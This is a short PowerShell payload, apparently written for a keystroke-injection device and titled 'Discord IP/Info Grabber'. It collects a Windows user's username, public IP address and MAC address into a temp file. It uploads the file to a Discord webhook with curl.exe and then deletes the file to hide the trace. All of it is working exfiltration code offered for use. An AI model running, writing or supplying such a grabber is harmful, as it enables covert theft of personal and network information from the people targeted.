REM     Title: Discord IP/Info Grabber
REM     Modified for Webhook: [Your Webhook]
REM     Description: Collects system info and exfiltrates via Discord
REM     Target: Windows 10/11

$FileName = "$env:temp\$env:USERNAME-Info-$(Get-Date -f yyyy-MM-dd_hh-mm).txt"
"User: $env:USERNAME`nIP: $(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content`nMAC: $(Get-NetAdapter | Select-Object -ExpandProperty MacAddress)" | Out-File $FileName
curl.exe -F "file1=@$FileName" $hook
Remove-Item $FileName -Force